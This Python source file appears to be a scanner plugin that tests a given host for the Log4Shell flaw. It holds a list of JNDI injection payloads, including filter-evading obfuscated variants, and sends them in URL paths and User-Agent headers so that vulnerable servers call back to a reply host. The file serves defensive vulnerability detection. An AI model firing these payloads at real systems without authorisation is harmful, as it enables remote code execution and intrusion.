import json
import logging
from base64 import b64encode
from os import getenv
from typing import Dict, List, Optional, Tuple, Union
from urllib.parse import urlparse

import requests
import urllib3
import validators

from boefjes.job_models import BoefjeMeta

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)


def run(boefje_meta: BoefjeMeta) -> List[Tuple[set, Union[bytes, str]]]:
    input_ = boefje_meta.arguments["input"]
    host = input_["name"]
    identifier = boefje_meta.id
    schemes = ["http", "https"]
    timeout = 15

    reply_fqdn_env = getenv("REPLY_FQDN", "invalid")
    reply_fqdn = reply_fqdn_env.lower()
    if not (reply_fqdn == "localhost" or validators.domain(reply_fqdn)):
        raise ValueError(f'"{reply_fqdn_env}" is not a valid fully qualified domain name')

    output = {}
    for scheme in schemes:
        url = f"{scheme}://{host}/"
        payloads = get_payloads(url, reply_fqdn, identifier)

        checks = [check(url, payload, timeout) for payload in payloads.values()]
        header_checks = [check_with_header(url, "User-Agent", payload, timeout) for payload in payloads.values()]

        output[scheme] = {
            "checks": dict(zip(payloads.keys(), checks)),
            "header_checks": dict(zip(payloads.keys(), header_checks)),
        }

    return [(set(), json.dumps(output).encode())]


def check_with_header(url_input: str, header_name: str, payload: str, timeout: int) -> Optional[str]:
    try:
        response = requests.get(url_input, headers={header_name: payload}, verify=False, timeout=timeout)

        return b64encode(response.content).decode()
    except requests.exceptions.ConnectionError as e:
        logging.error("HTTP connection to %s URL error: %s", url_input, e)


def check(url_input: str, payload: str, timeout: int) -> Optional[str]:
    try:
        response = requests.get(f"{url_input}{payload}", verify=False, timeout=timeout)

        return b64encode(response.content).decode()
    except requests.exceptions.ConnectionError as e:
        logging.error("HTTP connection to %s URL error: %s", url_input, e)


def get_payloads(url_input: str, reply_host: str, identifier: str) -> Dict[str, str]:
    payloads = [
        "${{jndi:ldap://{}/test.class}}",
        "${{jndi:dns://{}:53/test.class}}",
        "${{jndi:rmi://{}:1099/test.class}}",
        "${{${{::-j}}ndi:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}di:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}i:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}mi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{}/test.class}}",
    ]

    url_parsed = urlparse(url_input)
    combined = f"{identifier}.{url_parsed.hostname}.{reply_host}"
    filled_payloads = [payload.format(combined) for payload in payloads]

    return dict(zip(payloads, filled_payloads))
